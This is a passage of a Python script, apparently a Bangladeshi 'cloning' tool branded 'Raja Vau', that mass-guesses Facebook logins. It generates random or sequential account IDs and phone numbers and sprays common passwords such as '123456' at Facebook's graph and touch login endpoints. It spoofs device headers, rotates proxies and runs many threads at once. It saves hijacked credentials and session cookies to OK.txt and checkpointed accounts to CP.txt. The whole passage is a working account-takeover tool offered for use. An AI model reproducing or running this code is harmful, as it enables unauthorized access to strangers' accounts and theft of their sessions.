    print(f"{padding}\033[1;31m  █████╔╝ ███████║██╔████╔██║███████║██║  \033[0m")
    print(f"{padding}\033[1;31m  ██╔═██╗ ██╔══██║██║╚██╔╝██║██╔══██║██║  \033[0m")
    print(f"{padding}\033[1;31m  ██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║█████╗\033[0m\n")

    print(f"{padding}\033[1;36m╔═════════════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31mSTART TIME    :\033[1;32m {current_time}              \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╠═════════════════════════════════════════════════════╣\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mAdmin         :\033[1;37m Raja Vau                           \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mOwner         :\033[1;37m Raja Vau Teach World               \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mYouTube       :\033[1;34m https://youtube.com/@raja-vau      \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mContact Admin :\033[1;32m +880 1345-294347                 \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚═════════════════════════════════════════════════════╝\033[0m\n")

____banner____ = banner

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(____banner____)

def ___M_T_D_X___(ids, passlist):
    global loop, oks
    verify_active_session()
    try:
        for pas in passlist:
            if SESSION_REVOKED_EVENT.is_set():
                _force_logout_now()
            data = {
                'adid': str(uuid.uuid4()), 'email': ids, 'password': pas, 'cpl': 'true',
                'credentials_type': 'device_based_login_password', 'source': 'device_based_login',
                'error_detail_type': 'button_with_disabled', 'format': 'json',
                'generate_session_cookies': '1', 'generate_analytics_claim': '1',
                'generate_machine_id': '1', "family_device_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()), "locale": "en_US",
                "client_country_code": "US", "device_id": str(uuid.uuid4()),
                "method": "auth.login", "api_key": "882a8490361da98702bf97a021ddc14d",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"
            }
            head = {
                'content-type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com',
                'x-fb-sim-hni': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'WIFI',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'user-agent': w761(), 'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-device-group': '5120',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
                'x-fb-connection-quality': 'EXCELLENT', 'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                'accept-encoding': 'gzip, deflate', 'x-fb-http-engine': 'Liger'
            }
            response = requests.post("https://graph.facebook.com/auth/login", data=data, headers=head, verify=True, timeout=15).json()
            if "access_token" in response or "www.facebook.com" in response.get("error", {}).get("message", ""):
                print(f"\r\033[1;32m[RAJA-VAU-SUCCESS] {ids} | {pas}\033[0m")
                save_result("OK.txt", f"{ids}|{pas}\n")
                oks.append(str(ids))
                break
        loop += 1
        sys.stdout.write(f"\r\033[1;33m[RAJA-VAU] [Loop: {loop}] [OK: {len(oks)}] [CP: {len(cps)}]\033[0m")
        sys.stdout.flush()
    except Exception:
        pass

def ____methodA____(ids, pasx, tl):
    global loop, ok, cp
    verify_active_session()
    ewe = requests.Session()
    ua = f'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/156.0.8078.79 Mobile Safari/537.36 OPR/102.0.0.0|"Not_A Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"|11|156.0.8078.79'
    sys.stdout.write(f'\r\033[1;96m[⚡ KAMAL-M1]\033[0m \033[1;93m[{loop}]\033[0m \033[1;92m[✓ {ok}]\033[0m \033[1;95m[CP {cp}]\033[0m')
    sys.stdout.flush()
    for pw in pasx:
        try:
            if SESSION_REVOKED_EVENT.is_set():
                _force_logout_now()
            zz = None
            if os.path.exists('Proksi.txt'):
                xx = [x.strip() for x in open('Proksi.txt', 'r', encoding='utf-8', errors='ignore').read().splitlines() if x.strip()]
                if xx:
                    zz = {'http': 'socks4://' + random.choice(xx)}
            link = ewe.get("https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8", timeout=15).text
            data = {
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(link)).group(1),
                "try_number": 0,
                "unrecognized_tries": 0,
                "email": ids,
                "prefill_contact_point": ids,
                "prefill_source": "browser_dropdown",
                "prefill_type": "contact_point",
                "first_prefill_source": "browser_dropdown",
                "first_prefill_type": "contact_point",
                "had_cp_prefilled": True,
                "had_password_prefilled": False,
                "is_smart_lock": False,
                "bi_xrwh": 0,
                "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
                "jazoest": re.search(r'name="jazoest" value="(\d+)"', str(link)).group(1),
                "lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)
            }
            headers = {
                "Host": "touch.facebook.com",
                "content-length": str(len(data)),
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(
                    re.search(r'Chrome/(\d+)\.', str(ua)).group(1),
                    re.search(r'Chrome/(\d+).', str(ua)).group(1)
                ),
                "sec-ch-ua-mobile": "?1",
                "user-agent": __host__(),
                "x-response-format": "JSONStream",
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
                "viewport-width": "360",
                "x-requested-with": "XMLHttpRequest",
                "x-asbd-id": "129477",
                "dpr": "2",
                "sec-ch-prefers-color-scheme": "light",
                "sec-ch-ua-platform": '"Android"',
                "accept": "*/*",
                "origin": "https://touch.facebook.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
            }
            response = ewe.post(
                "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",
                data=data,
                headers=headers,
                allow_redirects=False,
                proxies=zz,
                timeout=15
            )
            if "checkpoint" in ewe.cookies.get_dict():
                uid_cp = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
                print(f"\r\033[1;31m[RAJA-VAU-CP] {uid_cp} | {pw}\033[0m")
                save_result("CP.txt", uid_cp + '|' + pw + '\n')
                cps.append(uid_cp)
                cp += 1
                break
            elif "c_user" in ewe.cookies.get_dict():
                kuki = (";").join(["%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items()])
                uid_ok = re.findall('c_user=(.*);xs', kuki)[0]
                print(f"\r\033[1;32m[RAJA-VAU-SUCCESS] {uid_ok} | {pw}\033[0m")
                save_result("OK.txt", uid_ok + '|' + pw + '|' + kuki + '\n')
                oks.append(uid_ok)
                ok += 1
                break
        except requests.exceptions.ConnectionError:
            time.sleep(10)
        except Exception:
            pass
    loop += 1
    sys.stdout.write(f'\r\033[1;96m[⚡ KAMAL-M1]\033[0m \033[1;93m[{loop}]\033[0m \033[1;92m[✓ {ok}]\033[0m \033[1;95m[CP {cp}]\033[0m')
    sys.stdout.flush()

def ____methodB____(ids, pasx, tl):
    global loop, ok, cp
    verify_active_session()
    try:
        for pw in pasx:
            if SESSION_REVOKED_EVENT.is_set():
                _force_logout_now()
            adid = str(''.join(random.Random().choices(string.hexdigits, k=16)))
            data = {
                "adid": adid, "format": "json", "device_id": str(uuid.uuid4()),
                "cpl": "true", "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login", "email": ids, "password": pw,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1", "meta_inf_fbmeta": "",
                "advertiser_id": str(uuid.uuid4()), "currently_logged_in_userid": "0",
                "locale": "en_US", "client_country_code": "US", "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"
            }
            headers = {'User-Agent': __host__(), 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com'}
            po = requests.post('https://graph.facebook.com/auth/login', data=data, headers=headers, timeout=15).json()
            if 'session_key' in po:
                uid_ok = str(po['uid'])
                coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                print(f"\r\033[1;32m[RAJA-VAU-SUCCESS] {uid_ok} | {pw}\033[0m")
                save_result("OK.txt", uid_ok + '|' + pw + '|' + coki + '\n')
                oks.append(uid_ok)
                ok += 1
                break
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                uid_cp = po['error']['error_data']['uid']
                print(f"\r\033[1;31m[RAJA-VAU-CP] {uid_cp} | {pw}\033[0m")
                save_result("CP.txt", str(uid_cp) + '|' + pw + '\n')
                cps.append(uid_cp)
                cp += 1
                break
        loop += 1
        sys.stdout.write(f"\r\033[1;33m[RAJA-VAU] [Loop: {loop}/{tl}] [OK: {len(oks)}] [CP: {len(cps)}]\033[0m")
        sys.stdout.flush()
    except Exception:
        pass

def _run_graph_login(uid, ua_func, extra_headers=None):
    global loop
    verify_active_session()
    session = requests.session()
    try:
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            if SESSION_REVOKED_EVENT.is_set():
                _force_logout_now()
            data = {
                'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()),
                'cpl': 'true', 'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login', 'email': str(uid), 'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1', 'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0',
                'locale': 'en_US', 'client_country_code': 'US', 'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {'User-Agent': ua_func(), 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com'}
            if extra_headers:
                headers.update(extra_headers)
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False, timeout=15).json()
            if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\033[1;32m[RAJA-VAU-SUCCESS] {uid} | {pw} | {creationyear(uid)}\033[0m")
                save_result("OK.txt", f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
        sys.stdout.write(f"\r\033[1;33m[RAJA-VAU] [Loop: {loop}] [OK: {len(oks)}] [CP: {len(cps)}]\033[0m")
        sys.stdout.flush()
    except Exception:
        time.sleep(3)

def login_1(uid):
    _run_graph_login(uid, use11r_agent)

def login_2(uid):
    extra = {
        'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752',
        'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False',
        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
        'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation',
        'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger',
        'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True',
        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
    }
    _run_graph_login(uid, win99, extra)

def login_3(uid):
    _run_graph_login(uid, window761)

def old_One():
    verify_active_session()
    os.system('clear' if os.name == 'posix' else 'cls')
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37m2009-2010 CODE                  \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37m2011-2014 CODE                  \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    ask = input(f"{padding}\033[1;33m [-] SELECT CODE ---> \033[0m").strip()
    limit = int(input(f"{padding}\033[1;33m [-] ENTER LIMIT  ---> \033[0m").strip())
    star = '10000'
    user = [str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999))) for _ in range(limit)]

    print(f"\n{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[A] \033[1;33m---> \033[1;37mMETHOD A (Fast Graph)           \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[B] \033[1;33m---> \033[1;37mMETHOD B (Win99 Agent)          \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[C] \033[1;33m---> \033[1;37mMETHOD C (Win761 Agent)         \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    meth = input(f"{padding}\033[1;33m [-] CHOICE (A/B/C) ---> \033[0m").strip().upper()

    with tred(max_workers=30) as pool:
        os.system('clear' if os.name == 'posix' else 'cls')
        banner()
        animate_loading(f"{padding} [+] Starting ALL SERIES Cloning...")
        for mal in user:
            if SESSION_REVOKED_EVENT.is_set():
                _force_logout_now()
            uid_val = star + mal
            if meth == 'A':
                pool.submit(login_1, uid_val)
            elif meth == 'B':
                pool.submit(login_2, uid_val)
            elif meth == 'C':
                pool.submit(login_3, uid_val)
    print(f"\n\n{padding}\033[1;32m [✓] Cloning Completed! OK: {len(oks)} | CP: {len(cps)}\033[0m")
    linex()
    input(f"\n{padding}\033[1;33m [Press Enter To Back Menu]\033[0m")

def old_Tow():
    verify_active_session()
    os.system('clear' if os.name == 'posix' else 'cls')
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    limit = int(input(f"{padding}\033[1;33m [-] ENTER LIMIT ---> \033[0m").strip())
    prefixes = ['100003', '100004']
    user = [random.choice(prefixes) + ''.join(random.choices('0123456789', k=9)) for _ in range(limit)]

    print(f"\n{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[A] \033[1;33m---> \033[1;37mMETHOD A                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[B] \033[1;33m---> \033[1;37mMETHOD B                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[C] \033[1;33m---> \033[1;37mMETHOD C                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    meth = input(f"{padding}\033[1;33m [-] SELECT METHOD (A/B/C) ---> \033[0m").strip().upper()

    with tred(max_workers=30) as pool:
        os.system('clear' if os.name == 'posix' else 'cls')
        banner()
        animate_loading(f"{padding} [+] Starting 100003/4 SERIES Cloning...")
        for uid_val in user:
            if SESSION_REVOKED_EVENT.is_set():
                _force_logout_now()
            if meth == 'A':
                pool.submit(login_1, uid_val)
            elif meth == 'B':
                pool.submit(login_2, uid_val)
            elif meth == 'C':
                pool.submit(login_3, uid_val)
    print(f"\n\n{padding}\033[1;32m [✓] Cloning Completed! OK: {len(oks)} | CP: {len(cps)}\033[0m")
    linex()
    input(f"\n{padding}\033[1;33m [Press Enter To Back Menu]\033[0m")

def old_Tree():
    verify_active_session()
    os.system('clear' if os.name == 'posix' else 'cls')
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    limit = int(input(f"{padding}\033[1;33m [-] ENTER LIMIT ---> \033[0m").strip())
    prefix = '100000'
    user = [prefix + ''.join(random.choices('0123456789', k=7)) for _ in range(limit)]

    print(f"\n{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[A] \033[1;33m---> \033[1;37mMETHOD A                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[B] \033[1;33m---> \033[1;37mMETHOD B                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[C] \033[1;33m---> \033[1;37mMETHOD C                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    meth = input(f"{padding}\033[1;33m [-] CHOICE (A/B/C) ---> \033[0m").strip().upper()

    with tred(max_workers=30) as pool:
        os.system('clear' if os.name == 'posix' else 'cls')
        banner()
        animate_loading(f"{padding} [+] Starting 2009 SERIES Cloning...")
        for uid_val in user:
            if SESSION_REVOKED_EVENT.is_set():
                _force_logout_now()
            if meth == 'A':
                pool.submit(login_1, uid_val)
            elif meth == 'B':
                pool.submit(login_2, uid_val)
            elif meth == 'C':
                pool.submit(login_3, uid_val)
    print(f"\n\n{padding}\033[1;32m [✓] Cloning Completed! OK: {len(oks)} | CP: {len(cps)}\033[0m")
    linex()
    input(f"\n{padding}\033[1;33m [Press Enter To Back Menu]\033[0m")

def old_Four():
    verify_active_session()
    os.system('clear' if os.name == 'posix' else 'cls')
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    limit = int(input(f"{padding}\033[1;33m [-] SELECT LIMIT ---> \033[0m").strip())
    ___B_A_L___ = "0123456789"
    user = ["".join(random.choices(___B_A_L___, k=random.randint(6, 9))) for _ in range(limit)]
    with tred(max_workers=40) as ____D_O_N____:
        os.system('clear' if os.name == 'posix' else 'cls')
        banner()
        animate_loading(f"{padding} [+] Starting AUTO LOGIN Cloning...")
        for lover in user:
            if SESSION_REVOKED_EVENT.is_set():
                _force_logout_now()
            ids = ___B_A_L___ + lover
            passlist = ["123456", "1234567", "12345678", "123456789", "123123"]
            ____D_O_N____.submit(___M_T_D_X___, ids, passlist)
    print(f"\n\n{padding}\033[1;32m [✓] Cloning Completed! OK: {len(oks)} | CP: {len(cps)}\033[0m")
    linex()
    input(f"\n{padding}\033[1;33m [Press Enter To Back Menu]\033[0m")

def random_option():
    verify_active_session()
    os.system('clear' if os.name == 'posix' else 'cls')
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mBANGLADESH                      \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37mINDIA                           \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[3] \033[1;33m---> \033[1;37mPAKISTAN                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[4] \033[1;33m---> \033[1;37mNEPAL                           \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[5] \033[1;33m---> \033[1;37mAFGHANISTAN                     \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[6] \033[1;33m---> \033[1;37mMALAYSIA                        \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    choice = input(f"{padding}\033[1;33m [-] SELECT OPTION ---> \033[0m").strip()
    if choice in ("1", "2", "3", "4", "5", "6"):
        KAMAL.append(choice)
        ______randomxmenu_______()
    else:
        random_option()

def ______randomxmenu_______():
    verify_active_session()
    os.system('clear' if os.name == 'posix' else 'cls')
    banner()
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 44) // 2)
    code = input(f"{padding}\033[1;33m [-] ENTER SIM CODE ---> \033[0m").strip()
    limit = int(input(f"{padding}\033[1;33m [-] ENTER LIMIT    ---> \033[0m").strip())

    print(f"\n{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mMETHOD 1 (Proxy Web)            \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37mMETHOD 2 (API Graph)            \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")
    ___method___ = input(f"{padding}\033[1;33m [-] SELECT METHOD (1/2) ---> \033[0m").strip()

    user = [''.join(random.choice(string.digits) for _ in range(8)) for _ in range(limit)]

    with ThreadPool(max_workers=60) as ____KAMAL____:
        os.system('clear' if os.name == 'posix' else 'cls')
        banner()
        animate_loading(f"{padding} [+] Starting Random Cloning...")
        for love in user:
            if SESSION_REVOKED_EVENT.is_set():
                _force_logout_now()
            ids = code + love
            pasx = [ids, love, ids[:6], ids[:7], ids[:8]]
            if ___method___ in ['1']:
                ____KAMAL____.submit(____methodA____, ids, pasx, str(len(user)))
            elif ___method___ in ['2']:
                ____KAMAL____.submit(____methodB____, ids, pasx, str(len(user)))
    print(f"\n\n{padding}\033[1;32m [✓] Random Cloning Completed! OK: {len(oks)} | CP: {len(cps)}\033[0m")
    linex()
    input(f"\n{padding}\033[1;33m [Press Enter To Back Menu]\033[0m")

def old_clone():
    while True:
        verify_active_session()
        os.system('clear' if os.name == 'posix' else 'cls')
        banner()
        width = max(get_width(), 40)
        padding = " " * max(0, (width - 44) // 2)

        print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32m[A] \033[1;33m---> \033[1;37m2010 - 2014 ALL                 \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32m[B] \033[1;33m---> \033[1;37m2012 - 2014 VIP SERIES          \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32m[C] \033[1;33m---> \033[1;37m2009 - 2010 SERIES              \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32m[D] \033[1;33m---> \033[1;37m2004 - 2007 AUTO LOGIN          \033[1;36m║\033[0m")
        print(f"{padding}\033[1;31m[0] \033[1;33m---> \033[1;37mBACK TO MAIN MENU               \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")

        _input = input(f"{padding}\033[1;33m [-] CHOICE ---> \033[0m").strip().upper()
        if _input == 'A':
            old_One()
        elif _input == 'B':
            old_Tow()
        elif _input == 'C':
            old_Tree()
        elif _input == 'D':
            old_Four()
        elif _input == '0':
            break
        else:
            print(f"{padding}\n\033[1;31m [!] Invalid Choice!\033[0m")
            time.sleep(1)

def start_cloning(series_name):
    verify_active_session()
    if series_name == "ALL SERIES":
        old_clone()
    elif series_name == "100003/4 SERIES":
        old_Tow()
    elif series_name == "2009 SERIES":
        old_Tree()

def main_menu():
    approval_system()
    type_name_animation()
    while True:
        verify_active_session()
        banner()
        width = max(get_width(), 40)
        padding = " " * max(0, (width - 44) // 2)

        print(f"{padding}\033[1;36m╔════════════════════════════════════════════╗\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32m[1] \033[1;33m---> \033[1;37mALL SERIES                      \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32m[2] \033[1;33m---> \033[1;37m100003/4 SERIES                 \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32m[3] \033[1;33m---> \033[1;37m2009 SERIES                     \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32m[4] \033[1;33m---> \033[1;37mRANDOM CLONING                  \033[1;36m║\033[0m")
        print(f"{padding}\033[1;31m[0] \033[1;33m---> \033[1;37mEXIT                            \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m╚════════════════════════════════════════════╝\033[0m")

        choice = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m").strip()
        if choice == '1':
            start_cloning("ALL SERIES")
        elif choice == '2':
            start_cloning("100003/4 SERIES")
        elif choice == '3':
            start_cloning("2009 SERIES")
        elif choice == '4':
            random_option()
        elif choice == '0':
            print(f"{padding}\n\033[1;31m [!] Exiting...\033[0m")
            break
        else:
            print(f"{padding}\n\033[1;31m [!] Invalid Choice!\033[0m")
            time.sleep(1)

if __name__ == '__main__':
    try:
        main_menu()
    except (KeyboardInterrupt, EOFError):
        print("\n\033[1;31m[!] Program closed.\033[0m")
        sys.exit(0)
